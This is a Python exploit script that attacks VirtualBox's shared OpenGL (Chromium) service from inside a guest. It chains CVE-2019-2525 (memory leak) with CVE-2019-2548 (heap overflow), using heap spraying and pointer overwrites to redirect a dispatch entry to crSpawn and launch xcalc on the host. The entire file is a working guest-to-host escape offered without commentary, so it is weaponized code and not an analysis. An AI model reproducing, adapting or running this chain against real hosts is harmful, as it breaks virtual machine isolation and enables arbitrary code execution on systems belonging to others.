import sys, os
from struct import pack, unpack
sys.path.append(os.path.abspath(os.path.dirname(__file__))+'/lib')
from chromium import *

def make_leak_msg(offset):
    msg = (
    pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
    + '\x00\x00\x00' + chr(CR_EXTEND_OPCODE)
    + pack("<I", offset)
    + pack("<I", CR_GETATTRIBLOCATION_EXTEND_OPCODE)
    + pack("<I", 0x41424344)
    )
    return msg

def make_pixel_msg():
    msg = (
            pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
            + '\x00\x00\x00' + chr(CR_READPIXELS_OPCODE)
            + pack("<III", 0, 0, 0)
            + pack("<I", 8) #height
            + pack("<I", 0x35)  #heap chunk
            + pack("<IIIII", 0, 0, 0, 0, 0)
            + pack("<I", 0x1ffffffd)    #bytes_per_row
            + pack("<I", 0)
            + pack("<II", 0xdeadbeef, 0xffffffff)   #uiID & uiSIZE
            )
    return msg

def svcfull_msg(addr):
    msg = (
            pack("<I", 0xdeadceba) #id
            + pack("<I", 0xeeeeeeee) #size
            + pack("<Q", addr) #pdata
            )
    return msg

def calc_msg(addr):
    msg = (
    pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
    + '\x00\x00\x00' + chr(CR_BOUNDSINFOCR_OPCODE)
    + pack('<I', 20)
    + "xcalc\x00\x20\x20\x20\x20\x20\x20\x20\x20"
    + "111111"
    + pack("<Q", addr)

    )
    return msg

if __name__ == '__main__':
    client = hgcm_connect("VBoxSharedCrOpenGL")
    set_version(client)
    
    #memory leak (CVE 2019-2525 활용)
    msg = make_leak_msg(0x28)
    
    while(1):
        leak = crmsg(client, msg)[8:16]
        leak = unpack('Q', leak)[0]

        if((leak>0x7f0000000000)and(leak<=0x7fffffffffff)): #reasonable leak
            print "yesssssssssss!! leak success!!"
            print 'leak: ',
            print hex(leak)
            break

    #heap spray
    heapspray = []
    for i in range(2000):
        heapspray.append(hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0, 0x20, 0, 'DDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEE'])[0])

    #free heap
    for i in range(1, 1900, 2):
        hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [heapspray[i], 'A'*0x20, 1337])
    

    #overwite uiID & uiSIZE (CVE 2019-2548 활용)
    msg = make_pixel_msg()
    crmsg(client, msg)

    
    #overwite uiID & uiSIZE & pDATA
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeadbeef, 0xffffffff, 0x210, svcfull_msg(leak+0x22ED10+0xAE98)])
    
    crSpawn = leak+0x22ED10-0x5361F0
    
    #overwrite cr_unpackDispatch.BoundsInfoCR to crSpawn
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeadceba, 0xeeeeeeee, 0, pack("<Q", crSpawn)])

    #make second parameter for crSpawn (AAW 활용)
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeadbeef, 0xffffffff, 0x210, svcfull_msg(leak+0x22ED10)])
    
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeadceba, 0xeeeeeeee, 0, "xcalc\00"])


    msg = calc_msg(leak+0x22ED10)
    crmsg(client, msg)



